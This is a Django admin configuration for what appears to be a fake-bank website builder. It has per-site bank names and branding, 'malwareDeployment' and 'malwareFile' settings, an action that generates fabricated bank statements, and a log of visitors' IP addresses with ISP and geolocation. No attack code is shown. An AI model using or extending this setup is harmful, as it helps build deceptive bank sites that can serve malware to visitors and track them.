from django.contrib import admin
from django.contrib.flatpages import forms
from django.forms import ModelForm
from django import forms

from django.contrib.flatpages.admin import FlatPageAdmin
from django.contrib.flatpages.forms import FlatpageForm
from django.contrib.flatpages.models import FlatPage

from django.forms.widgets import TextInput

from django.contrib.sites.admin import SiteAdmin
#from django.cont import SiteForm
from django.contrib.sites.models import Site

from .models import MyFlatPage, MySite, account, innerTemplate, logo, outerTemplate, staticFile, transaction, ip, font
from .transactionCreation import createBankStatement

class ExtendedSiteForm(ModelForm):
    class Meta:
        model = MySite
        fields = '__all__'
        widgets = {
            'header_colour': TextInput(attrs={'type': 'color'}),
            'footer_colour': TextInput(attrs={'type': 'color'}),
            'margin_colour': TextInput(attrs={'type': 'color'}),
            'Title_font_colour': TextInput(attrs={'type': 'color'}),
        }


class ExtendedSiteAdmin(SiteAdmin):
    form = ExtendedSiteForm
    fieldsets = (
        (None, {'fields': ('domain_value', 'name', 'bankName', 'header_colour',
         'footer_colour', 'margin_colour', 'Title_font_colour', 'template', 'logo', 'font', 'malwareDeployment', 'malwareFile')}),
    )


class ExtendedFlatPageForm(FlatpageForm):
    class Meta:
        model = MyFlatPage
        fields = '__all__'
        widgets = {
            'page_colour': TextInput(attrs={'type': 'color'}),
            'text_colour': TextInput(attrs={'type': 'color'}),
        }


class ExtendedFlatPageAdmin(FlatPageAdmin):
    form = ExtendedFlatPageForm
    fieldsets = (
        (None, {'fields': ('url', 'title', 'content', 'appearOnSites', 'registration_required',
         'appearOnNavbar', 'appearOnFooter', 'page_colour', 'text_colour', 'template')}),
    )


class innerTemplateForm(ModelForm):
    class Meta:
        model = innerTemplate
        fields = '__all__'


class innerTemplateAdmin(admin.ModelAdmin):
    form = innerTemplateForm
    fieldsets = (
        (None, {'fields': ('name', 'file')}),
    )


class outerTemplateForm(ModelForm):
    class Meta:
        model = outerTemplate
        fields = '__all__'


class outerTemplateAdmin(admin.ModelAdmin):
    form = outerTemplateForm
    fieldsets = (
        (None, {'fields': ('name', 'file')}),
    )


class staticFileForm(ModelForm):
    class Meta:
        model = staticFile
        fields = '__all__'


class staticFileAdmin(admin.ModelAdmin):
    form = staticFileForm
    fieldsets = (
        (None, {'fields': ('name', 'file')}),
    )

class fontForm(ModelForm):
    class Meta:
        model = font
        fields = '__all__'


class fontAdmin(admin.ModelAdmin):
    form = fontForm
    fieldsets = (
        (None, {'fields': ('name', 'file')}),
    )


class logoForm(ModelForm):
    class Meta:
        model = logo
        fields = '__all__'


class logoAdmin(admin.ModelAdmin):
    form = logoForm
    fieldsets = (
        (None, {'fields': ('name', 'file')}),
    )

@admin.action(description='Populate Transactions for selected accounts')
def populateTransactions(modeladmin, request, queryset):
    for acc in queryset:
        createBankStatement(acc)

class accountForm(ModelForm):
    class Meta:
        model = account
        fields = '__all__'


class accountAdmin(admin.ModelAdmin):
    form = accountForm
    fieldsets = (
        (None, {'fields': ('accountNumber', 'accountOwner', 'accountName', 'accountBalance', 'accountSortCode')}),
    )
    actions = [populateTransactions]


class transactionForm(ModelForm):
    class Meta:
        model = transaction
        fields = '__all__'


class transactionAdmin(admin.ModelAdmin):
    form = transactionForm
    fieldsets = (
        (None, {'fields': ('account', 'otherAccountNumber', 'withdrawal', 'amount', 'date', 'reference', 'type', 'newBalance')}),
    )


class ipForm(ModelForm):
    class Meta:
        model = ip
        fields = '__all__'


class ipAdmin(admin.ModelAdmin):
    form = ipForm
    fieldsets = (
        (None, {'fields': ('ip', 'user', 'country', 'region', 'city', 'postal', 'isp', 'latitude', 'longitude')}),
    )


admin.site.unregister(Site)
admin.site.register(MySite, ExtendedSiteAdmin)

admin.site.unregister(FlatPage)
admin.site.register(MyFlatPage, ExtendedFlatPageAdmin)

admin.site.register(innerTemplate, innerTemplateAdmin)
admin.site.register(outerTemplate, outerTemplateAdmin)
admin.site.register(staticFile, staticFileAdmin)
admin.site.register(logo, logoAdmin)
admin.site.register(account, accountAdmin)
admin.site.register(transaction, transactionAdmin)
admin.site.register(ip, ipAdmin)
admin.site.register(font, fontAdmin)